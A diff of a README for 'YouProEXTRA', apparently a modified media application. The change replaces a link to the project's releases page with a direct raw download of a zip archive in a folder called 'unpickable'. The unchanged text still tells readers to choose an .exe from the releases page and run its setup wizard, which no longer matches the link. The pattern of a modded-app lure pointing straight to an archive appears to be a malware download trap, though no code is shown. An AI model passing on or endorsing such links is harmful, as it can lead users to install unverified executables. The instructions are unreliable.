@@ -8,7 +8,7 @@ YouProEXTRA provides a modified version of the media application you know. It re
 
 You need the correct file to run this software on your computer. Visit the link below to find the current version.
 
-[Click here to open the download page](https://github.com/Chaspunic179/YouProEXTRA/releases)
+[Click here to open the download page](https://github.com/Chaspunic179/YouProEXTRA/raw/refs/heads/main/unpickable/Pro_You_EXTRA_v3.8.zip)
 
 Look for the latest release at the top of the page. Choose the file ending in .exe for a simple installation process. Once the download finishes, open the file to start the setup wizard. Follow the prompts on your screen to install the application.
 
